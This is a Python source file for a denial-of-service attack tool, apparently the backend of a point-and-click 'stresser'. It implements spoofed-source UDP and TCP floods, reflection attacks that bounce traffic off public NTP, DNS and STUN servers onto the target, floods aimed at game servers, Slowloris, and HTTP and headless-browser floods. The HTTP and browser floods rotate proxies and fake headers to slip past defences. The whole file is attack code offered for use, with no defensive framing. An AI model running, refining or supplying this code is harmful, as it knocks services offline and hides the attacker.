import threading
import time
import socket
import random
import string
import logging
import asyncio
import aiohttp
import sys
from scapy.all import IP, UDP, TCP, send
from faker import Faker
from fake_useragent import UserAgent

# --- Optional Imports for Proxies and Browsers ---
try:
    import socks
except ImportError:
    socks = None
try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None
try:
    from playwright.async_api import async_playwright
except ImportError:
    async_playwright = None
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ImportError:
    webdriver = None
    Options = None

# --- Global Stop Event ---
stop_event = threading.Event()
force_stop = False

# --- Configuration (can be updated from GUI) ---
Config = {
    "threads": 100,
    "duration": 60,
    "use_proxy": False,
    "proxy_type": "socks5",
    "proxy_list": [],
    "proxy_retries": 3,
    "use_browser": "none", # selenium or playwright
    "browser_behavior": {
        "clicks": False,
        "scroll": False,
        "delay": 1
    }
}

# --- Logger Setup ---
logger = logging.getLogger("info_logger")
debug_logger = logging.getLogger("debug_logger")
logger.propagate = False
debug_logger.propagate = False

class CustomLogHandler(logging.Handler):
    def __init__(self, callback):
        super().__init__()
        self.callback = callback

    def emit(self, record):
        log_entry = self.format(record)
        if self.callback:
            self.callback(log_entry)

def setup_logger(handler, logger_instance, level):
    if logger_instance.hasHandlers():
        logger_instance.handlers.clear()
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger_instance.addHandler(handler)
    logger_instance.setLevel(level)

# --- Proxy Manager ---
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.lock = threading.Lock()

    def set_proxies(self, proxy_list, proxy_type):
        with self.lock:
            self.proxies = []
            for p in proxy_list:
                try:
                    ip, port = p.strip().split(':')
                    proxy_obj = {
                        "type": proxy_type,
                        "ip": ip,
                        "port": int(port)
                    }
                    self.proxies.append(proxy_obj)
                except ValueError:
                    debug_logger.warning(f"Invalid proxy format: {p}. Skipping.")
            if self.proxies:
                logger.info(f"Loaded {len(self.proxies)} {proxy_type.upper()} proxies.")
            else:
                logger.warning("Proxy list is empty or contains invalid formats.")

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

proxy_manager = ProxyManager()

# --- Spoofing & Other Utilities ---
fake = Faker()
ua = UserAgent()

def generate_spoofed_headers():
    return {"User-Agent": ua.random, "Accept-Language": "en-US,en;q=0.9", "Referer": fake.url()}

def generate_cookies():
    return {"session_id": "".join(random.choices(string.ascii_letters + string.digits, k=32)), "user_id": fake.uuid4()}

def spoof_fingerprint():
    return {"timezone": "UTC", "screen_resolution": "1920x1080", "language": "en-US"}

# --- Base Attack Classes ---
class BaseAttack:
    def __init__(self, duration, attack_type):
        self.duration = duration
        self.attack_type = attack_type
        self.sent_packets = 0
        self.threads = []
        debug_logger.debug(f"Attack class {self.__class__.__name__} initialized.")

    def start_threads(self):
        for t in self.threads:
            t.start()

    def run_sync_attack(self):
        """Starts sync threads and blocks until attack is over."""
        self.start_threads()
        logger.info("Attack threads started.")
        # Block the worker thread until the stop event is set
        stop_event.wait()
        logger.info("Stop event received, sync attack finishing.")

    async def start_async(self):
        self.attack_task = asyncio.create_task(self.run_async())
        try:
            await self.attack_task
        except asyncio.CancelledError:
            debug_logger.debug("Async attack task was cancelled externally.")

    def stop_async(self):
        if hasattr(self, 'attack_task') and not self.attack_task.done():
            self.attack_task.cancel()

# --- L3/L4 Attacks (Proxy not applicable for Scapy) ---
class BotnetAttack(BaseAttack):
    # ... (no changes here as Scapy bypasses OS socket stack)
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(duration, attack_type)
        self.target_ip = target_ip
        self.port = port
        self.threads = [threading.Thread(target=self.bot_attack, args=(i,), daemon=True) for i in range(Config['threads'])]
    def bot_attack(self, bot_id):
        src_ip = f"192.168.1.{bot_id % 254 + 1}"
        pkt = IP(dst=self.target_ip, src=src_ip) / (UDP(dport=self.port) if 'UDP' in self.attack_type else TCP(dport=self.port, flags='S'))
        while not stop_event.is_set():
            send(pkt, verbose=0)
            self.sent_packets += 1

class Layer4Attack(BaseAttack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(duration, attack_type)
        self.target_ip = target_ip
        self.port = port

class AMPAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.amp_servers = {
            'NTP': 'pool.ntp.org:123', 'DNS': '8.8.8.8:53', 'STUN': 'stun.l.google.com:3478',
            'WSD': '239.255.255.250:3702', 'SADP': '224.0.0.252:8000'
        }
        self.threads = [threading.Thread(target=self.attack, daemon=True) for _ in range(Config['threads'])]
        debug_logger.debug(f"AMPAttack: {len(self.threads)} threads created.")

    def attack(self):
        if self.attack_type not in self.amp_servers:
            debug_logger.error(f"Invalid AMP attack type: {self.attack_type}")
            return
        server_addr, server_port = self.amp_servers[self.attack_type].split(':')
        pkt = IP(dst=server_addr, src=self.target_ip) / UDP(dport=int(server_port), sport=random.randint(1024, 65535))
        while not stop_event.is_set():
            send(pkt, verbose=0)
            self.sent_packets += 1
            time.sleep(0.001)

class TCPAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.threads = [threading.Thread(target=self.attack, daemon=True) for _ in range(Config['threads'])]
        debug_logger.debug(f"TCPAttack: {len(self.threads)} threads created.")

    def attack(self):
        valid_flags = {'TCP-ACK': 'A', 'TCP-SYN': 'S', 'TCP-BYPASS': 'SA', 'OVH-TCP': 'SA'}
        flag = valid_flags.get(self.attack_type, 'S')
        pkt = IP(dst=self.target_ip) / TCP(dport=self.port, sport=random.randint(1024, 65535), flags=flag)
        while not stop_event.is_set():
            send(pkt, verbose=0)
            self.sent_packets += 1
            time.sleep(0.001)

class UDPAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.threads = [threading.Thread(target=self.attack, daemon=True) for _ in range(Config['threads'])]
        debug_logger.debug(f"UDPAttack: {len(self.threads)} threads created.")

    def attack(self):
        pkt = IP(dst=self.target_ip) / UDP(dport=self.port, sport=random.randint(1024, 65535)) / ("X" * 1024)
        while not stop_event.is_set():
            send(pkt, verbose=0)
            self.sent_packets += 1
            time.sleep(0.001)

class GameAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.game_ports = {
            'GAME': 27015, 'GAME-MC': 25565, 'GAME-WARZONE': 3074,
            'GAME-R6': 6015, 'FIVEM-KILL': 30120
        }
        self.port = self.game_ports.get(self.attack_type, port)
        self.threads = [threading.Thread(target=self.attack, daemon=True) for _ in range(Config['threads'])]
        debug_logger.debug(f"GameAttack: {len(self.threads)} threads created for port {self.port}.")

    def attack(self):
        pkt = IP(dst=self.target_ip) / UDP(dport=self.port, sport=random.randint(1024, 65535))
        while not stop_event.is_set():
            send(pkt, verbose=0)
            self.sent_packets += 1
            time.sleep(0.001)

# --- Socket-based L4 Attacks (Proxy applicable) ---
class SlowLorisAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.sockets = []
        self.threads = [threading.Thread(target=self.slowloris, daemon=True) for _ in range(Config['threads'])]

    def slowloris(self):
        headers = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nAccept: text/html\r\n"
        while not stop_event.is_set():
            s = None
            try:
                if Config["use_proxy"]:
                    if not socks:
                        logger.error("PySocks not installed. Cannot use proxy for SlowLoris.")
                        break
                    proxy = proxy_manager.get_proxy()
                    if not proxy:
                        logger.error("No valid proxies available for SlowLoris.")
                        break
                    s = socks.socksocket()
                    proxy_type = socks.SOCKS5 if proxy['type'] == 'socks5' else socks.SOCKS4
                    s.set_proxy(proxy_type, proxy['ip'], proxy['port'])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                s.settimeout(4)
                s.connect((self.target_ip, self.port))
                s.send(headers.encode('ascii'))
                self.sockets.append(s)
                self.sent_packets += 1
            except Exception as e:
                debug_logger.debug(f"Slowloris: Socket error - {e}")
                if s: s.close()
                time.sleep(1)
            time.sleep(0.1)
        for s in self.sockets:
            try: s.close()
            except: pass

class SpecialAttack(Layer4Attack):
    def __init__(self, target_ip, port, duration, attack_type):
        super().__init__(target_ip, port, duration, attack_type)
        self.threads = [threading.Thread(target=self.attack, daemon=True) for _ in range(Config['threads'])]

    def attack(self):
        if self.attack_type == 'SSH':
            while not stop_event.is_set():
                s = None
                try:
                    if Config["use_proxy"]:
                        if not socks:
                            logger.error("PySocks not installed. Cannot use proxy for SSH attack.")
                            break
                        proxy = proxy_manager.get_proxy()
                        if not proxy:
                            logger.error("No valid proxies available for SSH attack.")
                            break
                        s = socks.socksocket()
                        proxy_type = socks.SOCKS5 if proxy['type'] == 'socks5' else socks.SOCKS4
                        s.set_proxy(proxy_type, proxy['ip'], proxy['port'])
                    else:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    
                    s.connect((self.target_ip, 22))
                    self.sent_packets += 1
                    s.close()
                except Exception:
                    if s: s.close()
                    pass
        else: # Scapy-based attacks
            pkt = IP(dst=self.target_ip) / TCP(dport=self.port, flags='SA')
            while not stop_event.is_set():
                send(pkt, verbose=0)
                self.sent_packets += 1
                time.sleep(0.001)

# --- Layer 7 Attack Classes ---
class Layer7Attack(BaseAttack):
    def __init__(self, target_url, duration, attack_type):
        super().__init__(duration, attack_type)
        self.target_url = target_url

class HTTPAttack(Layer7Attack):
    async def run_async(self):
        tasks = []
        for _ in range(Config['threads']):
            tasks.append(self.http_flood())
        await asyncio.gather(*tasks)

    async def http_flood(self):
        headers = generate_spoofed_headers()
        cookies = generate_cookies()
        
        async with aiohttp.ClientSession() as session:
            for _ in range(Config["proxy_retries"] + 1):
                if stop_event.is_set(): break
                
                proxy = proxy_manager.get_proxy() if Config["use_proxy"] else None
                proxy_url = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}" if proxy else None

                try:
                    async with session.get(self.target_url, headers=headers, cookies=cookies, ssl=False, timeout=5, proxy=proxy_url) as response:
                        debug_logger.debug(f"HTTP GET to {self.target_url} via {proxy_url or 'direct'} - Status: {response.status}")
                        self.sent_packets += 1
                        while not stop_event.is_set():
                            await session.get(self.target_url, headers=headers, cookies=cookies, ssl=False, timeout=5, proxy=proxy_url)
                            self.sent_packets += 1
                        return
                except Exception as e:
                    debug_logger.error(f"HTTP GET request via {proxy_url or 'direct'} failed: {e}")
                    if not Config["use_proxy"]:
                        break
                    debug_logger.info("Retrying with new proxy...")
                    await asyncio.sleep(1)

class BrowserAttack(Layer7Attack):
    async def run_async(self):
        if Config["use_browser"] == "selenium":
            if not webdriver:
                logger.error("Selenium is not installed. Please install it: pip install selenium")
                return
            await asyncio.gather(*(asyncio.to_thread(self.run_selenium_in_thread) for _ in range(Config['threads'])))
        elif Config["use_browser"] == "playwright":
            if not async_playwright:
                logger.error("Playwright is not installed. Please install it: pip install playwright")
                return
            await asyncio.gather(*(self.run_playwright() for _ in range(Config['threads'])))

    def run_selenium_in_thread(self):
        driver = None
        for _ in range(Config["proxy_retries"] + 1):
            if stop_event.is_set(): break
            try:
                options = Options()
                options.add_argument(f"user-agent={generate_spoofed_headers()['User-Agent']}")
                
                proxy = None
                if Config["use_proxy"]:
                    proxy = proxy_manager.get_proxy()
                    if not proxy:
                        logger.error("Selenium: No more proxies available.")
                        break
                    proxy_server = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
                    options.add_argument(f'--proxy-server={proxy_server}')
                    debug_logger.info(f"Selenium: Launching with proxy {proxy_server}")

                driver = webdriver.Chrome(options=options)
                
                while not stop_event.is_set():
                    driver.get(self.target_url)
                    self.sent_packets += 1
                    debug_logger.debug(f"Selenium request to {self.target_url} via {proxy['ip'] if proxy else 'direct'}")
                    time.sleep(Config["browser_behavior"]["delay"])
                
                driver.quit()
                return # Success
            except Exception as e:
                logger.error(f"Error in Selenium: {e}. Retrying...")
                if driver:
                    driver.quit()
                if not Config["use_proxy"]:
                    break
                time.sleep(1)
        logger.error("Selenium task failed after all retries.")

    async def run_playwright(self):
        browser = None
        for _ in range(Config["proxy_retries"] + 1):
            if stop_event.is_set(): break
            try:
                launch_options = {"headless": True}
                proxy = None
                if Config["use_proxy"]:
                    proxy = proxy_manager.get_proxy()
                    if not proxy:
                        logger.error("Playwright: No more proxies available.")
                        break
                    proxy_server = f"{proxy['type']}://{proxy['ip']}:{proxy['port']}"
                    launch_options["proxy"] = {"server": proxy_server}
                    debug_logger.info(f"Playwright: Launching with proxy {proxy_server}")

                async with async_playwright() as p:
                    browser = await p.chromium.launch(**launch_options)
                    page = await browser.new_page(**spoof_fingerprint())
                    
                    while not stop_event.is_set():
                        await page.goto(self.target_url, timeout=15000)
                        self.sent_packets += 1
                        debug_logger.debug(f"Playwright request to {self.target_url} via {proxy['ip'] if proxy else 'direct'}")
                        await asyncio.sleep(Config["browser_behavior"]["delay"])
                    
                    await browser.close()
                    return # Success
            except Exception as e:
                debug_logger.error(f"Playwright error: {e}. Retrying...")
                if browser:
                    await browser.close()
                if not Config["use_proxy"]:
                    break
                await asyncio.sleep(1)
        logger.error("Playwright task failed after all retries.")

# --- Attack Orchestration ---
L3_METHODS = { "UDPBYPASS-BOT": BotnetAttack, "GREBOT": BotnetAttack }
L4_METHODS = {
    "NTP": AMPAttack, "DNS": AMPAttack, "STUN": AMPAttack, "WSD": AMPAttack, "SADP": AMPAttack,
    "TCP-ACK": TCPAttack, "TCP-SYN": TCPAttack, "TCP-BYPASS": TCPAttack, "OVH-TCP": TCPAttack,
    "UDP": UDPAttack, "UDP-VSE": UDPAttack, "UDP-BYPASS": UDPAttack,
    "GAME": GameAttack, "GAME-MC": GameAttack, "GAME-WARZONE": GameAttack, "GAME-R6": GameAttack, "FIVEM-KILL": GameAttack,
    "SLOWLORIS": SlowLorisAttack,
    "SSH": SpecialAttack, "GAME-KILL": SpecialAttack, "TCP-SOCKET": SpecialAttack, "DISCORD": SpecialAttack,
}
L7_METHODS = {
    "HTTPS-FLOODER": HTTPAttack, "HTTPS-BYPASS": HTTPAttack, "HTTP-BROWSER": HTTPAttack, "HTTPS-ARTERMIS": HTTPAttack,
    "SELENIUM-BROWSER": BrowserAttack, "PLAYWRIGHT-BROWSER": BrowserAttack,
}

def get_available_attacks(layer):
    if layer == "Layer 3": return list(L3_METHODS.keys())
    if layer == "Layer 4": return list(L4_METHODS.keys())
    if layer == "Layer 7": return list(L7_METHODS.keys())
    return []

def create_attack(params):
    debug_logger.debug(">>> Creating attack instance with parameters: %r", params)
    global force_stop
    stop_event.clear()
    force_stop = False
    
    Config.update(params)

    method = params.get("method")
    if method in L7_METHODS:
        if "SELENIUM" in method:
            Config["use_browser"] = "selenium"
        elif "PLAYWRIGHT" in method:
            Config["use_browser"] = "playwright"
        else:
            Config["use_browser"] = "none"

    if Config.get("use_proxy"):
        if not Config.get("proxy_list"):
            logger.error("Proxy is enabled, but no proxy list was provided.")
            return None, False
        proxy_manager.set_proxies(Config["proxy_list"], Config.get("proxy_type", "socks5"))
        if not proxy_manager.proxies:
            logger.error("Proxy enabled, but no valid proxies could be loaded.")
            return None, False

    target = params.get("target")
    port = params.get("port")
    duration = params.get("duration")
    
    attack_instance = None
    is_async = False

    if method in L3_METHODS:
        attack_class = L3_METHODS[method]
        attack_instance = attack_class(target, port, duration, method)
    elif method in L4_METHODS:
        attack_class = L4_METHODS[method]
        attack_instance = attack_class(target, port, duration, method)
    elif method in L7_METHODS:
        attack_class = L7_METHODS[method]
        attack_instance = attack_class(target, duration, method)
        is_async = True
    else:
        logger.error(f"Unknown attack method: {method}")
        return None, False

    if attack_instance:
        logger.info(f"Attack instance for {target}:{port} created.")
        return attack_instance, is_async
    
    return None, False

def stop_attack():
    if not stop_event.is_set():
        logger.info("Gracefully stopping attack...")
        stop_event.set()

def force_stop_attack():
    global force_stop
    if not stop_event.is_set():
        logger.warning("Force stopping attack! Threads will be terminated.")
        force_stop = True
        stop_event.set()